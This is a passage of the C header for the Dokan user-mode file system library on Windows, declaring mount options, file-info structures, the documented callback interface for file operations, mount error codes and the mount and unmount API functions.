 * Forward the kernel driver global and volume logs to the userland.
 * Can be very slow if single thread is enabled.
 */
#define DOKAN_OPTION_DISPATCH_DRIVER_LOGS (1 << 11)

/** @} */

typedef VOID *DOKAN_HANDLE, **PDOKAN_HANDLE;

/**
 * \struct DOKAN_OPTIONS
 * \brief Dokan mount options used to describe Dokan device behavior.
 * \see DokanMain
 */
typedef struct _DOKAN_OPTIONS {
  /** Version of the Dokan features requested without dots (version "123" is equal to Dokan version 1.2.3). */
  USHORT Version;
  /** Only use a single thread to process events. This is highly not recommended as can easily create a bottleneck. */
  BOOLEAN SingleThread;
  /** Features enabled for the mount. See \ref DOKAN_OPTION. */
  ULONG Options;
  /** FileSystem can store anything here. */
  ULONG64 GlobalContext;
  /** Mount point. It can be a driver letter like "M:\" or a folder path "C:\mount\dokan" on a NTFS partition. */
  LPCWSTR MountPoint;
  /**
   * UNC Name for the Network Redirector
   * \see <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff556761(v=vs.85).aspx">Support for UNC Naming</a>
   */
  LPCWSTR UNCName;
  /**
   * Max timeout in milliseconds of each request before Dokan gives up to wait events to complete.
   * A timeout request is a sign that the userland implementation is no longer able to properly manage requests in time.
   * The driver will therefore unmount the device when a timeout trigger in order to keep the system stable.
   * The default timeout value is 15 seconds.
   */
  ULONG Timeout;
  /** Allocation Unit Size of the volume. This will affect the file size. */
  ULONG AllocationUnitSize;
  /** Sector Size of the volume. This will affect the file size. */
  ULONG SectorSize;
  /** Length of the optional VolumeSecurityDescriptor provided. Set 0 will disable the option. */
  ULONG VolumeSecurityDescriptorLength;
  /** Optional Volume Security descriptor. See <a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-initializesecuritydescriptor">InitializeSecurityDescriptor</a> */
  CHAR VolumeSecurityDescriptor[VOLUME_SECURITY_DESCRIPTOR_MAX_SIZE];
} DOKAN_OPTIONS, *PDOKAN_OPTIONS;

/**
 * \struct DOKAN_FILE_INFO
 * \brief Dokan file information on the current operation.
 */
typedef struct _DOKAN_FILE_INFO {
  /**
   * Context that can be used to carry information between operations.
   * The context can carry whatever type like \c HANDLE, struct, int,
   * internal reference that will help the implementation understand the request context of the event.
   */
  ULONG64 Context;
  /** Reserved. Used internally by Dokan library. Never modify. */
  ULONG64 DokanContext;
  /** A pointer to DOKAN_OPTIONS which was passed to \ref DokanMain or \ref DokanCreateFileSystem. */
  PDOKAN_OPTIONS DokanOptions;
  /**
   * Reserved. Used internally by Dokan library. Never modify.
   * If the processing for the event requires extra data to be associated with it
   * then a pointer to that data can be placed here
   */
  PVOID ProcessingContext;
  /**
   * Process ID for the thread that originally requested a given I/O operation.
   */
  ULONG ProcessId;
  /**
   * Requesting a directory file.
   * Must be set in \ref DOKAN_OPERATIONS.ZwCreateFile if the file appears to be a folder.
   */
  UCHAR IsDirectory;
  /** Flag if the file has to be deleted during DOKAN_OPERATIONS. Cleanup event. */
  UCHAR DeleteOnClose;
  /** Read or write is paging IO. */
  UCHAR PagingIo;
  /** Read or write is synchronous IO. */
  UCHAR SynchronousIo;
  /** Read or write directly from data source without cache */
  UCHAR Nocache;
  /**  If \c TRUE, write to the current end of file instead of using the Offset parameter. */
  UCHAR WriteToEndOfFile;
} DOKAN_FILE_INFO, *PDOKAN_FILE_INFO;

#define DOKAN_EXCEPTION_NOT_INITIALIZED 0x0f0ff0ff
#define DOKAN_EXCEPTION_INITIALIZATION_FAILED 0x0fbadbad
#define DOKAN_EXCEPTION_SHUTDOWN_FAILED 0x0fbadf00

/**
 * \brief FillFindData Used to add an entry in FindFiles operation
 * \return 1 if buffer is full, otherwise 0 (currently it never returns 1)
 */
typedef int(WINAPI *PFillFindData)(PWIN32_FIND_DATAW, PDOKAN_FILE_INFO);

/**
 * \brief FillFindStreamData Used to add an entry in FindStreams
 * \return FALSE if the buffer is full, otherwise TRUE
 */
typedef BOOL(WINAPI *PFillFindStreamData)(PWIN32_FIND_STREAM_DATA, PVOID);

// clang-format off

/**
 * \struct DOKAN_OPERATIONS
 * \brief Dokan API callbacks interface
 *
 * DOKAN_OPERATIONS is a struct of callbacks that describe all Dokan API operations
 * that will be called when Windows access to the filesystem.
 *
 * If an error occurs, return NTSTATUS (https://support.microsoft.com/en-us/kb/113996).
 * Win32 Error can be converted to \c NTSTATUS with \ref DokanNtStatusFromWin32
 *
 * All callbacks can be set to \c NULL or return \c STATUS_NOT_IMPLEMENTED
 * if supporting one of them is not desired. Be aware that returning such values to important callbacks
 * such as DOKAN_OPERATIONS.ZwCreateFile / DOKAN_OPERATIONS.ReadFile / ... would make the filesystem not work or become unstable.
 */
typedef struct _DOKAN_OPERATIONS {
  /**
  * \brief CreateFile Dokan API callback
  *
  * CreateFile is called each time a request is made on a file system object.
  *
  * In case \c OPEN_ALWAYS & \c CREATE_ALWAYS are successfully opening an
  * existing file, \c STATUS_OBJECT_NAME_COLLISION should be returned instead of \c STATUS_SUCCESS .
  * This will inform Dokan that the file has been opened and not created during the request.
  *
  * If the file is a directory, CreateFile is also called.
  * In this case, CreateFile should return \c STATUS_SUCCESS when that directory
  * can be opened and DOKAN_FILE_INFO.IsDirectory has to be set to \c TRUE.
  * On the other hand, if DOKAN_FILE_INFO.IsDirectory is set to \c TRUE
  * but the path targets a file, \c STATUS_NOT_A_DIRECTORY must be returned.
  *
  * DOKAN_FILE_INFO.Context can be used to store Data (like \c HANDLE)
  * that can be retrieved in all other requests related to the Context.
  * To avoid memory leak, Context needs to be released in DOKAN_OPERATIONS.Cleanup.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param SecurityContext SecurityContext, see https://msdn.microsoft.com/en-us/library/windows/hardware/ff550613(v=vs.85).aspx
  * \param DesiredAccess Specifies an <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff540466(v=vs.85).aspx">ACCESS_MASK</a> value that determines the requested access to the object.
  * \param FileAttributes Specifies one or more FILE_ATTRIBUTE_XXX flags, which represent the file attributes to set if a file is created or overwritten.
  * \param ShareAccess Type of share access, which is specified as zero or any combination of FILE_SHARE_* flags.
  * \param CreateDisposition Specifies the action to perform if the file does or does not exist.
  * \param CreateOptions Specifies the options to apply when the driver creates or opens the file.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff566424(v=vs.85).aspx">See ZwCreateFile for more information about the parameters of this callback (MSDN).</a>
  * \see DokanMapKernelToUserCreateFileFlags
  */
  NTSTATUS(DOKAN_CALLBACK *ZwCreateFile)(LPCWSTR FileName,
      PDOKAN_IO_SECURITY_CONTEXT SecurityContext,
      ACCESS_MASK DesiredAccess,
      ULONG FileAttributes,
      ULONG ShareAccess,
      ULONG CreateDisposition,
      ULONG CreateOptions,
      PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief Cleanup Dokan API callback
  *
  * Cleanup request before \ref CloseFile is called.
  *
  * When DOKAN_FILE_INFO.DeleteOnClose is \c TRUE, the file in Cleanup must be deleted.
  * The function cannot fail therefore the filesystem need to ensure ahead
  * that a the delete can safely happen during Cleanup. 
  * See DeleteFile documentation for explanation.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param DokanFileInfo Information about the file or directory.
  * \see DeleteFile
  * \see DeleteDirectory
  */
  void(DOKAN_CALLBACK *Cleanup)(LPCWSTR FileName,
                                PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief CloseFile Dokan API callback
  *
  * Clean remaining Context
  *
  * CloseFile is called at the end of the life of the context.
  * Anything remaining in \ref DOKAN_FILE_INFO.Context must be cleared before returning.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param DokanFileInfo Information about the file or directory.
  */
  void(DOKAN_CALLBACK *CloseFile)(LPCWSTR FileName,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief ReadFile Dokan API callback
  *
  * ReadFile callback on the file previously opened in DOKAN_OPERATIONS.ZwCreateFile.
  * It can be called by different threads at the same time, so the read/context has to be thread safe.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param Buffer Read buffer that has to be filled with the read result.
  * \param BufferLength Buffer length and read size to continue with.
  * \param ReadLength Total data size that has been read.
  * \param Offset Offset from where the read has to be continued.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see WriteFile
  */
  NTSTATUS(DOKAN_CALLBACK *ReadFile)(LPCWSTR FileName,
    LPVOID Buffer,
    DWORD BufferLength,
    LPDWORD ReadLength,
    LONGLONG Offset,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief WriteFile Dokan API callback
  *
  * WriteFile callback on the file previously opened in DOKAN_OPERATIONS.ZwCreateFile
  * It can be called by different threads at the same time, sp the write/context has to be thread safe.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param Buffer Data that has to be written.
  * \param NumberOfBytesToWrite Buffer length and write size to continue with.
  * \param NumberOfBytesWritten Total number of bytes that have been written.
  * \param Offset Offset from where the write has to be continued.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see ReadFile
  */
  NTSTATUS(DOKAN_CALLBACK *WriteFile)(LPCWSTR FileName,
    LPCVOID Buffer,
    DWORD NumberOfBytesToWrite,
    LPDWORD NumberOfBytesWritten,
    LONGLONG Offset,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief FlushFileBuffers Dokan API callback
  *
  * Clears buffers for this context and causes any buffered data to be written to the file.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *FlushFileBuffers)(LPCWSTR FileName,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief GetFileInformation Dokan API callback
  *
  * Get specific information on a file.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param Buffer BY_HANDLE_FILE_INFORMATION struct to fill.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *GetFileInformation)(LPCWSTR FileName,
    LPBY_HANDLE_FILE_INFORMATION Buffer,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief FindFiles Dokan API callback
  *
  * List all files in the requested path
  * \ref DOKAN_OPERATIONS.FindFilesWithPattern is checked first. If it is not implemented or
  * returns \c STATUS_NOT_IMPLEMENTED, then FindFiles is called, if implemented.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param FillFindData Callback that has to be called with PWIN32_FIND_DATAW that contain file information.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see FindFilesWithPattern
  */
  NTSTATUS(DOKAN_CALLBACK *FindFiles)(LPCWSTR FileName,
    PFillFindData FillFindData,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief FindFilesWithPattern Dokan API callback
  *
  * Same as \ref DOKAN_OPERATIONS.FindFiles but with a search pattern.\n
  * The search pattern is a Windows MS-DOS-style expression.
  * It can contain wild cards and extended characters or none of them. See \ref DokanIsNameInExpression.
  *
  * If the function is not implemented, \ref DOKAN_OPERATIONS.FindFiles
  * will be called instead and the result will be filtered internally by the library.
  *
  * \param PathName Path requested by the Kernel on the FileSystem.
  * \param SearchPattern Search pattern.
  * \param FillFindData Callback that has to be called with PWIN32_FIND_DATAW that contains file information.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see FindFiles
  * \see DokanIsNameInExpression
  */
  NTSTATUS(DOKAN_CALLBACK *FindFilesWithPattern)(LPCWSTR PathName,
    LPCWSTR SearchPattern,
    PFillFindData FillFindData,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief SetFileAttributes Dokan API callback
  *
  * Set file attributes on a specific file
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param FileAttributes FileAttributes to set on file.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *SetFileAttributes)(LPCWSTR FileName,
    DWORD FileAttributes,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief SetFileTime Dokan API callback
  *
  * Set file attributes on a specific file
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param CreationTime Creation FILETIME.
  * \param LastAccessTime LastAccess FILETIME.
  * \param LastWriteTime LastWrite FILETIME.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *SetFileTime)(LPCWSTR FileName,
    CONST FILETIME *CreationTime,
    CONST FILETIME *LastAccessTime,
    CONST FILETIME *LastWriteTime,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief DeleteFile Dokan API callback
  *
  * Check if it is possible to delete a file.
  *
  * DeleteFile will also be called with DOKAN_FILE_INFO.DeleteOnClose set to \c FALSE
  * to notify the driver when the file is no longer requested to be deleted.
  *
  * The file in DeleteFile should not be deleted, but instead the file
  * must be checked as to whether or not it can be deleted,
  * and \c STATUS_SUCCESS should be returned (when it can be deleted) or
  * appropriate error codes, such as \c STATUS_ACCESS_DENIED or
  * \c STATUS_OBJECT_NAME_NOT_FOUND, should be returned.
  *
  * When \c STATUS_SUCCESS is returned, a Cleanup call is received afterwards with
  * DOKAN_FILE_INFO.DeleteOnClose set to \c TRUE. Only then must the closing file
  * be deleted.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see DeleteDirectory
  * \see Cleanup
  */
  NTSTATUS(DOKAN_CALLBACK *DeleteFile)(LPCWSTR FileName,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief DeleteDirectory Dokan API callback
  *
  * Check if it is possible to delete a directory.
  *
  * DeleteDirectory will also be called with DOKAN_FILE_INFO.DeleteOnClose set to \c FALSE
  * to notify the driver when the file is no longer requested to be deleted.
  *
  * The Directory in DeleteDirectory should not be deleted, but instead
  * must be checked as to whether or not it can be deleted,
  * and \c STATUS_SUCCESS should be returned (when it can be deleted) or
  * appropriate error codes, such as \c STATUS_ACCESS_DENIED,
  * \c STATUS_OBJECT_PATH_NOT_FOUND, or \c STATUS_DIRECTORY_NOT_EMPTY, should
  * be returned.
  *
  * When \c STATUS_SUCCESS is returned, a Cleanup call is received afterwards with
  * DOKAN_FILE_INFO.DeleteOnClose set to \c TRUE. Only then must the closing file
  * be deleted.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or \c NTSTATUS appropriate to the request result.
  * \ref DeleteFile
  * \ref Cleanup
  */
  NTSTATUS(DOKAN_CALLBACK *DeleteDirectory)(LPCWSTR FileName,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief MoveFile Dokan API callback
  *
  * Move a file or directory to a new destination
  *
  * \param FileName Path for the file to be moved.
  * \param NewFileName Path for the new location of the file.
  * \param ReplaceIfExisting If destination already exists, can it be replaced?
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *MoveFile)(LPCWSTR FileName,
    LPCWSTR NewFileName,
    BOOL ReplaceIfExisting,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief SetEndOfFile Dokan API callback
  *
  * SetEndOfFile is used to truncate or extend a file (physical file size).
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param ByteOffset File length to set.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *SetEndOfFile)(LPCWSTR FileName,
    LONGLONG ByteOffset,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief SetAllocationSize Dokan API callback
  *
  * SetAllocationSize is used to truncate or extend a file.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param AllocSize File length to set.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *SetAllocationSize)(LPCWSTR FileName,
    LONGLONG AllocSize,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief LockFile Dokan API callback
  *
  * Lock file at a specific offset and data length.
  * This is only used if \ref DOKAN_OPTION_FILELOCK_USER_MODE is enabled.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param ByteOffset Offset from where the lock has to be continued.
  * \param Length Data length to lock.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see UnlockFile
  */
  NTSTATUS(DOKAN_CALLBACK *LockFile)(LPCWSTR FileName,
    LONGLONG ByteOffset,
    LONGLONG Length,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief UnlockFile Dokan API callback
  *
  * Unlock file at a specific offset and data length.
  * This is only used if \ref DOKAN_OPTION_FILELOCK_USER_MODE is enabled.
  *
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param ByteOffset Offset from where the lock has to be continued.
  * \param Length Data length to lock.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see LockFile
  */
  NTSTATUS(DOKAN_CALLBACK *UnlockFile)(LPCWSTR FileName,
    LONGLONG ByteOffset,
    LONGLONG Length,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief GetDiskFreeSpace Dokan API callback
  *
  * Retrieves information about the amount of space that is available on a disk volume.
  * It consits of the total amount of space, the total amount of free space, and
  * the total amount of free space available to the user that is associated with the calling thread.
  *
  * Neither GetDiskFreeSpace nor \ref GetVolumeInformation
  * save the  DOKAN_FILE_INFO.Context.
  * Before these methods are called, \ref ZwCreateFile may not be called.
  * (ditto \ref CloseFile and \ref Cleanup)
  *
  * \param FreeBytesAvailable Amount of available space.
  * \param TotalNumberOfBytes Total size of storage space
  * \param TotalNumberOfFreeBytes Amount of free space
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or \c NTSTATUS appropriate to the request result.
  * \see <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa364937(v=vs.85).aspx"> GetDiskFreeSpaceEx function (MSDN)</a>
  * \see GetVolumeInformation
  */
  NTSTATUS(DOKAN_CALLBACK *GetDiskFreeSpace)(PULONGLONG FreeBytesAvailable,
    PULONGLONG TotalNumberOfBytes,
    PULONGLONG TotalNumberOfFreeBytes,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief GetVolumeInformation Dokan API callback
  *
  * Retrieves information about the file system and volume associated with the specified root directory.
  *
  * Neither GetVolumeInformation nor GetDiskFreeSpace
  * save the \ref DOKAN_FILE_INFO#Context.
  * Before these methods are called, \ref ZwCreateFile may not be called.
  * (ditto \ref CloseFile and \ref Cleanup)
  *
  * VolumeName length can be anything that fit in the provided buffer.
  * But some Windows component expect it to be no longer than 32 characters
  * that why it is recommended to set a value under this limit.
  *
  * FileSystemName could be anything up to 10 characters.
  * But Windows check few feature availability based on file system name.
  * For this, it is recommended to set NTFS or FAT here.
  *
  * \c FILE_READ_ONLY_VOLUME is automatically added to the
  * FileSystemFlags if \ref DOKAN_OPTION_WRITE_PROTECT was
  * specified in DOKAN_OPTIONS when the volume was mounted.
  *
  * \param VolumeNameBuffer A pointer to a buffer that receives the name of a specified volume.
  * \param VolumeNameSize The length of a volume name buffer.
  * \param VolumeSerialNumber A pointer to a variable that receives the volume serial number.
  * \param MaximumComponentLength A pointer to a variable that receives the maximum length.
  * \param FileSystemFlags A pointer to a variable that receives flags associated with the specified file system.
  * \param FileSystemNameBuffer A pointer to a buffer that receives the name of the file system.
  * \param FileSystemNameSize The length of the file system name buffer.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa364993(v=vs.85).aspx"> GetVolumeInformation function (MSDN)</a>
  * \see GetDiskFreeSpace
  */
  NTSTATUS(DOKAN_CALLBACK *GetVolumeInformation)(LPWSTR VolumeNameBuffer,
    DWORD VolumeNameSize,
    LPDWORD VolumeSerialNumber,
    LPDWORD MaximumComponentLength,
    LPDWORD FileSystemFlags,
    LPWSTR FileSystemNameBuffer,
    DWORD FileSystemNameSize,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief Mounted Dokan API callback
  *
  * Called when Dokan successfully mounts the volume.
  *
  * If \ref DOKAN_OPTION_MOUNT_MANAGER is enabled and the drive letter requested is busy,
  * the MountPoint can contain a different drive letter that the mount manager assigned us.
  *
  * \param MountPoint The mount point assign to the instance.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see Unmounted
  */
  NTSTATUS(DOKAN_CALLBACK *Mounted)(LPCWSTR MountPoint, PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief Unmounted Dokan API callback
  *
  * Called when Dokan is unmounting the volume.
  *
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or \c NTSTATUS appropriate to the request result.
  * \see Mounted
  */
  NTSTATUS(DOKAN_CALLBACK *Unmounted)(PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief GetFileSecurity Dokan API callback
  *
  * Get specified information about the security of a file or directory.
  *
  * Return \c STATUS_NOT_IMPLEMENTED to let dokan library build a sddl of the current process user with authenticate user rights for context menu.
  * Return \c STATUS_BUFFER_OVERFLOW if buffer size is too small.
  *
  * \since Supported since version 0.6.0. The version must be specified in \ref DOKAN_OPTIONS.Version.
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param SecurityInformation A SECURITY_INFORMATION value that identifies the security information being requested.
  * \param SecurityDescriptor A pointer to a buffer that receives a copy of the security descriptor of the requested file.
  * \param BufferLength Specifies the size, in bytes, of the buffer.
  * \param LengthNeeded A pointer to the variable that receives the number of bytes necessary to store the complete security descriptor.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see SetFileSecurity
  * \see <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446639(v=vs.85).aspx">GetFileSecurity function (MSDN)</a>
  */
  NTSTATUS(DOKAN_CALLBACK *GetFileSecurity)(LPCWSTR FileName,
    PSECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    ULONG BufferLength,
    PULONG LengthNeeded,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief SetFileSecurity Dokan API callback
  *
  * Sets the security of a file or directory object.
  *
  * \since Supported since version 0.6.0. The version must be specified in \ref DOKAN_OPTIONS.Version.
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param SecurityInformation Structure that identifies the contents of the security descriptor pointed by \a SecurityDescriptor param.
  * \param SecurityDescriptor A pointer to a SECURITY_DESCRIPTOR structure.
  * \param BufferLength Specifies the size, in bytes, of the buffer.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  * \see GetFileSecurity
  * \see <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa379577(v=vs.85).aspx">SetFileSecurity function (MSDN)</a>
  */
  NTSTATUS(DOKAN_CALLBACK *SetFileSecurity)(LPCWSTR FileName,
    PSECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    ULONG BufferLength,
    PDOKAN_FILE_INFO DokanFileInfo);

  /**
  * \brief FindStreams Dokan API callback
  *
  * Retrieve all NTFS Streams informations on the file.
  * This is only called if \ref DOKAN_OPTION_ALT_STREAM is enabled.
  *
  * \since Supported since version 0.8.0. The version must be specified in \ref DOKAN_OPTIONS.Version.
  * \param FileName File path requested by the Kernel on the FileSystem.
  * \param FillFindStreamData Callback that has to be called with PWIN32_FIND_STREAM_DATA that contain stream information.
  * \param FindStreamContext Context for the event to pass to the callback FillFindStreamData.
  * \param DokanFileInfo Information about the file or directory.
  * \return \c STATUS_SUCCESS on success or NTSTATUS appropriate to the request result.
  */
  NTSTATUS(DOKAN_CALLBACK *FindStreams)(LPCWSTR FileName,
    PFillFindStreamData FillFindStreamData,
    PVOID FindStreamContext,
    PDOKAN_FILE_INFO DokanFileInfo);

} DOKAN_OPERATIONS, *PDOKAN_OPERATIONS;

// clang-format on

/**
 * \defgroup DokanMainResult DokanMainResult
 * \brief \ref DokanMain \ref DokanCreateFileSystem returns error codes
 */
/** @{ */

/** Dokan mount succeed. */
#define DOKAN_SUCCESS 0
/** Dokan mount error. */
#define DOKAN_ERROR -1
/** Dokan mount failed - Bad drive letter. */
#define DOKAN_DRIVE_LETTER_ERROR -2
/** Dokan mount failed - Can't install driver.  */
#define DOKAN_DRIVER_INSTALL_ERROR -3
/** Dokan mount failed - Driver answer that something is wrong. */
#define DOKAN_START_ERROR -4
/**
 * Dokan mount failed.
 * Can't assign a drive letter or mount point.
 * Probably already used by another volume.
 */
#define DOKAN_MOUNT_ERROR -5
/**
 * Dokan mount failed.
 * Mount point is invalid.
 */
#define DOKAN_MOUNT_POINT_ERROR -6
/**
 * Dokan mount failed.
 * Requested an incompatible version.
 */
#define DOKAN_VERSION_ERROR -7

/** @} */

/**
 * \defgroup Dokan Dokan
 */
/** @{ */

/**
 * \brief Initialize all required Dokan internal resources.
 *
 * This needs to be called only once before trying to use \ref DokanMain or \ref DokanCreateFileSystem for the first time.
 * Otherwise both will fail and raise an exception.
 */
VOID DOKANAPI DokanInit();

/**
 * \brief Release all allocated resources by \ref DokanInit when they are no longer needed.
 *
 * This should be called when the application no longer expects to create a new FileSystem with
 * \ref DokanMain or \ref DokanCreateFileSystem and after all devices are unmount.
 */
VOID DOKANAPI DokanShutdown();

/**
 * \brief Mount a new Dokan Volume.
 *
 * This function block until the device is unmounted.
 * If the mount fails, it will directly return a \ref DokanMainResult error.
 * 
 * See \ref DokanCreateFileSystem to create mount Dokan Volume asynchronously.
 *
 * \param DokanOptions a \ref DOKAN_OPTIONS that describe the mount.
 * \param DokanOperations Instance of \ref DOKAN_OPERATIONS that will be called for each request made by the kernel.
 * \return \ref DokanMainResult status.
 */
int DOKANAPI DokanMain(PDOKAN_OPTIONS DokanOptions,
                       PDOKAN_OPERATIONS DokanOperations);

/**
 * \brief Mount a new Dokan Volume.
 *
 * It is mandatory to have called \ref DokanInit previously to use this API.
 * 
 * This function returns directly on device mount or on failure.
 * See \ref DokanMainResult for possible errors.
 * 
 * \ref DokanWaitForFileSystemClosed can be used to wait until the device is unmount.
 *
 * \param DokanOptions a \ref DOKAN_OPTIONS that describe the mount.
 * \param DokanOperations Instance of \ref DOKAN_OPERATIONS that will be called for each request made by the kernel.
 * \param DokanInstance Dokan mount instance context that can be used for related instance calls like \ref DokanIsFileSystemRunning .
 * \return \ref DokanMainResult status.
 */
int DOKANAPI DokanCreateFileSystem(_In_ PDOKAN_OPTIONS DokanOptions,
                                   _In_ PDOKAN_OPERATIONS DokanOperations,
                                   _Out_ DOKAN_HANDLE *DokanInstance);

/**
 * \brief Check if the FileSystem is still running or not.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \return Whether the FileSystem is still running or not.
 */
BOOL DOKANAPI DokanIsFileSystemRunning(_In_ DOKAN_HANDLE DokanInstance);

/**
 * \brief Wait until the FileSystem is unmount.
 *
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 * \return See <a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject</a> for a description of return values.
 */
DWORD DOKANAPI DokanWaitForFileSystemClosed(_In_ DOKAN_HANDLE DokanInstance,
                                            _In_ DWORD dwMilliseconds);

/**
 * \brief Unmount the Dokan instance.
 * 
 * Unmount and wait until all resources of the \c DokanInstance are released.
 * 
 * \param DokanInstance The dokan mount context created by \ref DokanCreateFileSystem .
 */
VOID DOKANAPI DokanCloseHandle(_In_ DOKAN_HANDLE DokanInstance);

/**
 * \brief Unmount a Dokan device from a driver letter.
 *
 * \param DriveLetter Dokan driver letter to unmount.
 * \return \c TRUE if device was unmounted or \c FALSE in case of failure or device not found.
 */
BOOL DOKANAPI DokanUnmount(WCHAR DriveLetter);

/**
 * \brief Unmount a Dokan device from a mount point
 *
 * \param MountPoint Mount point to unmount ("Z", "Z:", "Z:\", "Z:\MyMountPoint").
 * \return \c TRUE if device was unmounted or \c FALSE in case of failure or device not found.
 */
BOOL DOKANAPI DokanRemoveMountPoint(LPCWSTR MountPoint);

/**
 * \brief Checks whether Name matches Expression
 *
 * Behave like \c FsRtlIsNameInExpression routine from <a href="https://msdn.microsoft.com/en-us/library/ff546850(v=VS.85).aspx">Microsoft</a>\n
 * \c * (asterisk) Matches zero or more characters.\n
 * <tt>?</tt> (question mark) Matches a single character.\n
 * \c DOS_DOT (\c " quotation mark) Matches either a period or zero characters beyond the name string.\n
